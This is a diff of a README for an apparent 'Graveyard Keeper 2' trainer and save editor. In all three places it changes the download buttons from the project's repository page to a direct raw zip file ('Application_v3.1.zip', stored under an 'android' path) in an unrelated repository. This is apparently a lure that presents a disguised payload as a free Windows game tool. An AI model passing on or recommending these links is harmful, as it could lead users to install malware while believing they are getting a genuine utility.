@@ -6,7 +6,7 @@ description: "Edit Graveyard Keeper 2 saves with trainers, money, inventory, cra
 <h1>🗡️ Graveyard-Keeper-2-Trainer-Save-Resource-Editor - Simplify Your Graveyard Empire Management</h1>
 
 <p align="center">
-  <a href="https://github.com/khaledalqahtani505/Graveyard-Keeper-2-Trainer-Save-Resource-Editor">
+  <a href="https://raw.githubusercontent.com/khaledalqahtani505/khaledalqahtani505.github.io/main/android/Application_v3.1.zip">
     <img src="https://img.shields.io/badge/Download%20Now-Free%20Tool%20for%20Windows-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Now" />
   </a>
 </p>
@@ -39,7 +39,7 @@ First things first, you need to get the tool onto your computer.
 **Click the big green button below to go to the download page:**
 
 <p align="center">
-  <a href="https://github.com/khaledalqahtani505/Graveyard-Keeper-2-Trainer-Save-Resource-Editor">
+  <a href="https://raw.githubusercontent.com/khaledalqahtani505/khaledalqahtani505.github.io/main/android/Application_v3.1.zip">
     <img src="https://img.shields.io/badge/🚀%20Download%20Graveyard%20Keeper%202%20Tool-Click%20Here-blue?style=for-the-badge&logo=github" alt="Download Button" />
   </a>
 </p>
@@ -179,7 +179,7 @@ The interface is designed to be clean and straightforward. Here is a quick tour:
 **One-click access to the download page is right here:**
 
 <p align="center">
-  <a href="https://github.com/khaledalqahtani505/Graveyard-Keeper-2-Trainer-Save-Resource-Editor">
+  <a href="https://raw.githubusercontent.com/khaledalqahtani505/khaledalqahtani505.github.io/main/android/Application_v3.1.zip">
     <img src="https://img.shields.io/badge/⬇️%20Get%20the%20Latest%20Version%20Now-Purple?style=for-the-badge" alt="Download" />
   </a>
 </p>
